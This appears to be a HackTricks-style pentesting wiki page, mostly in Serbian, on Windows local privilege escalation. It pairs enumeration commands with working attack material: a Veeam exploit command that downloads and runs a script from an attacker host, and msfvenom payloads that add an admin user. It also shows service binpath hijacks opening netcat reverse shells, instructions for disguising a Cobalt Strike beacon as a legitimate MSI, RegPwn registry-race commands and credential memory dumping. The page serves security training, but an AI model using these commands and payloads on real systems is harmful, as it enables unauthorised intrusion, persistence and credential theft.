# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Uvodna Windows teorija

### Access Tokens

**Ako ne znate šta su Windows Access Tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Pogledajte sledeću stranicu za više informacija o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ako ne znate šta su integrity levels u Windows, trebalo bi da pročitate sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows bezbednosne kontrole

Postoje različite stvari u Windows koje mogu **sprečiti vas da izvršite enumeraciju sistema**, pokrenete executables ili čak **detektuju vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **odbrambene** **mehanizme** pre nego što započnete privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess procesi pokrenuti putem `RAiLaunchAdminProcess` mogu se zloupotrebiti da se dostigne High IL bez promptova kada su AppInfo secure-path provere zaobiđene. Pogledajte posvećeni UIAccess/Admin Protection bypass workflow ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation može se zloupotrebiti za proizvoljno SYSTEM pisanje u registar (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li Windows verzija ima neku poznatu ranjivost (proverite i primenjene zakrpe).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Ovaj [site](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pronalaženje detaljnih informacija o Microsoft sigurnosnim ranjivostima. Ova baza sadrži više od 4.700 sigurnosnih ranjivosti, pokazujući **ogromnu površinu napada** koju Windows okruženje predstavlja.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima watson ugrađen)_

**Lokalno sa informacijama o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Ima li bilo kakvih credential/Juicy info sačuvanih u env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Istorija
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript fajlovi

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i rezultati izlaza možda neće biti zabeleženi.

Da biste to omogućili, sledite uputstva u odeljku "Transcript files" dokumentacije, i izaberite **"Module Logging"** umesto **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Da biste videli poslednjih 15 događaja iz Powershell logova, možete izvršiti:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Potpuni zapis aktivnosti i celokupnog sadržaja izvršavanja skripta se beleži, osiguravajući da je svaki blok koda dokumentovan dok se izvršava. Ovaj proces čuva sveobuhvatan revizorski zapis svake aktivnosti, koristan za forensics i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja dobijaju se detaljni uvidi u proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zapisivanje događaja za Script Block može se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Podešavanja interneta
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Pogoni
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Možete kompromitovati sistem ako se ažuriranja ne zahtevaju koristeći http**S** već http.

Počnite proverom da li mreža koristi non-SSL WSUS update pokretanjem sledećeg u cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ili sledeće u PowerShell-u:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ako dobijete odgovor poput nekog od ovih:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Mnogi enterprise agenti izlažu localhost IPC površinu i privilegovani update kanal. Ako se enrollment može prisiliti na attacker server i updater veruje rogue root CA ili ima slabe provere potpisivanja, lokalni korisnik može isporučiti maliciozni MSI koji SYSTEM service instalira. Pogledajte generalizovanu tehniku (zasnovanu na Netskope stAgentSvc chain – CVE-2025-0309) ovde:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

Postoji ranjivost tipa **local privilege escalation** u Windows **domain** okruženjima pod određenim uslovima. Ti uslovi uključuju okruženja u kojima **LDAP signing is not enforced,** korisnici imaju mogućnost da sebi dodeljuju prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD),** kao i sposobnost korisnika da kreiraju računare unutar domena. Važno je napomenuti da se ovi **requirements** zadovoljavaju korišćenjem **default settings**.

Pronađite **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku attack pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ako** su ova 2 unosa u registru **omogućena** (vrednost je **0x1**), korisnici bilo kog privilegija mogu **install** (execute) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ako imate meterpreter sesiju, možete automatizovati ovu tehniku koristeći modul **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up da kreirate u trenutnom direktorijumu Windows MSI binarni fajl za eskalaciju privilegija. Ovaj skript ispisuje prekompajlirani MSI installer koji traži dodavanje korisnika/grupe (tako da će vam biti potreban GIU pristup):
```
Write-UserAddMSI
```
Samo izvršite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj tutorijal da naučite kako da kreirate MSI wrapper koristeći ovaj alat. Imajte na umu da možete obuhvatiti "**.bat**" fajl ako **samo** želite da **izvršavate** **komandne linije**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generišite** pomoću Cobalt Strike ili Metasploit nov **Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i ukucajte "installer" u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite **Next**.
- Dajte projektu ime, na primer **AlwaysPrivesc**, koristite **`C:\privesc`** za lokaciju, izaberite **place solution and project in the same directory**, i kliknite **Create**.
- Nastavite da klikćete **Next** dok ne dođete do koraka 3 od 4 (choose files to include). Kliknite **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer** i u **Properties**, promenite **TargetPlatform** sa **x86** na **x64**.
- Postoje i druga svojstva koja možete promeniti, kao što su **Author** i **Manufacturer**, što može učiniti instaliranu aplikaciju legitimnijom.
- Kliknite desnim tasterom na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite vaš **beacon.exe** fajl i kliknite **OK**. Ovo će osigurati da se beacon payload izvrši čim se pokrene installer.
- U okviru **Custom Action Properties**, promenite **Run64Bit** u **True**.
- Na kraju, **build it**.
- Ako se pojavi upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, pobrinite se da postavite platformu na x64.

### MSI Installation

Da biste izvršili **instalaciju** malicioznog `.msi` fajla u **pozadini:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Da biste iskoristili ovu ranjivost možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Podešavanja audita

Ova podešavanja određuju šta se **zapisuje**, zato obratite pažnju.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — korisno je znati gde se šalju logovi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** je dizajniran za **upravljanje local Administrator passwords**, osiguravajući da je svaka lozinka **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke su sigurno uskladištene unutar Active Directory i mogu im pristupiti samo korisnici kojima su kroz ACLs dodeljena odgovarajuća ovlašćenja, omogućavajući im da pregledaju local admin passwords ako su autorizovani.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **plain-text lozinke se čuvaju u LSASS** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo pojačanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, dodatno osiguravajući sistem.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti credentials koji su sačuvani na uređaju od pretnji kao što su pass-the-hash napadi.| [**Više informacija o Credentials Guard ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Kredencijali domena** se autentifikuju od strane **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se korisnički podaci za prijavu autentifikuju od strane registrovanog sigurnosnog paketa, domenski kredencijali za korisnika se obično uspostavljaju.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Korisnici i grupe

### Enumeracija korisnika i grupa

Treba da proverite da li neke od grupa kojima pripadate imaju zanimljive dozvole.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupe sa privilegijama

Ako pripadate nekoj grupi sa privilegijama, možda ćete moći da eskalirate privilegije. Saznajte o grupama sa privilegijama i kako ih zloupotrebiti za eskalaciju privilegija ovde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da **saznate o zanimljivim tokens** i kako ih zloupotrebiti:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije
```bash
qwinsta
klist sessions
```
### Kućni folderi
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politika lozinki
```bash
net accounts
```
### Preuzmi sadržaj međuspremnika
```bash
powershell -command "Get-Clipboard"
```
## Pokrenuti procesi

### Dozvole fajlova i foldera

Prvo, pri listanju procesa **proverite da li postoje lozinke u komandnoj liniji procesa**.\
Proverite da li možete **pregaziti neki pokrenuti binarni fajl** ili da li imate pravo pisanja u folderu binarnih fajlova kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Uvek proverite da li se pokreću mogući [**electron/cef/chromium debuggers** — možete ih iskoristiti za eskalaciju privilegija](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Provera dozvola binarnih fajlova procesa**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Provera dozvola za foldere sa binarnim fajlovima procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Možete napraviti memory dump pokrenutog procesa koristeći **procdump** iz sysinternals. Servisi kao FTP često imaju **credentials in clear text in memory** — pokušajte da napravite dump memorije i pročitate **credentials**.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Nesigurne GUI aplikacije

**Aplikacije koje se izvršavaju kao SYSTEM mogu dozvoliti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: "Windows Help and Support" (Windows + F1), potražite "command prompt", kliknite na "Click to open Command Prompt"

## Servisi

Service Triggers omogućavaju Windows-u da pokrene servis kada se dogode određeni uslovi (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, itd.). Čak i bez prava SERVICE_START često možete pokrenuti privilegovane servise aktiviranjem njihovih okidača. Pogledajte tehnike enumeracije i aktivacije ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

Dobijte listu servisa:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Dozvole

Možete koristiti **sc** da dobijete informacije o servisu
```bash
sc qc <service_name>
```
Preporučuje se imati binarni **accesschk** iz _Sysinternals_ za proveru potrebnog nivoa privilegija za svaki servis.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Preporučuje se da se proveri da li "Authenticated Users" mogu da modifikuju bilo koju uslugu:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

Ako dobijate ovu grešku (na primer sa SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Možete ga omogućiti koristeći
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Imajte u vidu da servis upnphost zavisi od SSDPSRV da bi radio (za XP SP1)**

**Drugo zaobilazno rešenje** ovog problema je pokretanje:
```
sc.exe config usosvc start= auto
```
### **Izmena putanje izvršne datoteke servisa**

U scenariju gde grupa "Authenticated users" ima **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršni binarni fajl servisa. Da biste izmenili i pokrenuli **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponovno pokretanje servisa
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegije se mogu eskalirati kroz razna dozvole:

- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfiguraciju binarnog fajla servisa.
- **WRITE_DAC**: Omogućava rekonfiguraciju dozvola, što dovodi do mogućnosti menjanja konfiguracija servisa.
- **WRITE_OWNER**: Dozvoljava preuzimanje vlasništva i rekonfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracija servisa.

Za detekciju i eksploataciju ove ranjivosti može se iskoristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole binarnih fajlova servisa

**Proverite da li možete izmeniti binarni fajl koji se izvršava od strane servisa** ili da li imate **dozvole za pisanje na folderu** gde se binarni fajl nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete dobiti svaki binarni fajl koji se izvršava od strane servisa koristeći **wmic** (ne u system32) i proveriti svoje dozvole koristeći **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Možete takođe koristiti **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dozvole za izmenu registra servisa

Trebalo bi da proverite da li možete izmeniti bilo koji registar servisa.\
Možete **proveriti** svoje **dozvole** nad registrom **servisa** tako što ćete:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju `FullControl` dozvole. Ako je tako, binarni fajl koji servis izvršava može biti izmenjen.

Da biste promenili putanju binarnog fajla koji se izvršava:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva korisnički kontrolisanu konfiguraciju.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom logon/secure-desktop tranzicija i na koji korisnik može pisati.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Popunite **HKCU ATConfig** vrednost koju želite da SYSTEM upiše.
2. Pokrenite secure-desktop copy (npr. **LockWorkstation**), koja pokreće AT broker tok.
3. **Pobedite u trci** stavljanjem **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada oplock aktivira, zamenite **HKLM Session ATConfig** ključ sa **registry link** ka zaštićenoj HKLM destinaciji.
4. SYSTEM upisuje vrednost po izboru napadača u preusmereni HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji normalni korisnik može pokrenuti (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna exploit implementacija **locks the workstation** kao deo trke.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Dozvole AppendData/AddSubdirectory nad registrima servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete kreirati podregistre unutar njega**. U slučaju Windows servisa, ovo je **dovoljno da se izvrši proizvoljni kod:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Putanje servisa bez navodnika

Ako putanja do izvršnog fajla nije u navodnicima, Windows će pokušati da izvrši svaki deo pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Prikaži sve putanje servisa bez navodnika, osim onih koje pripadaju ugrađenim Windows servisima:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Možete otkriti i iskoristiti** ovu ranjivost pomoću metasploit: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati servisni binarni fajl pomoću metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Akcije oporavka

